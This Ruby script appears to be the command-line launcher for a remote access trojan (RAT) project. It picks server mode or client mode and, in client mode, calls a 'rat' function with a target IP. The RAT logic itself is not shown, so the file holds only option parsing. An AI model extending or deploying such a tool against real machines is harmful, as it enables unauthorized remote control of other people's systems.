#!/usr/bin/ruby
require_relative 'server/server'
require_relative '../client/rat'
require 'optparse'

options = {}

OptionParser.new do |opts|
  opts.on('-s', '--server', "Server mode") do |s|
    options[:server] = s
  end
  opts.on('-c', '--client IP' ,'Client mode and the IP address to connect to') do |c|
    options[:client] = c
    opts.on('-h', '--help', "Help menu") do
      puts opts
      exit
    end
  end

end.parse!
if options.has_key?(:server) && options.has_key?(:client)
  puts 'invalid program arguments'
  exit! 1
end
if options.has_key? :server
  server = Server.new
  server.start
elsif options.has_key? :client
  ip = options[:client]
  rat(ip)
else
  puts "Please specify which mode you would like."
  exit 1
end

=begin
port = 6666

if ARGV[0]
  port = ARGV[0]
end


=end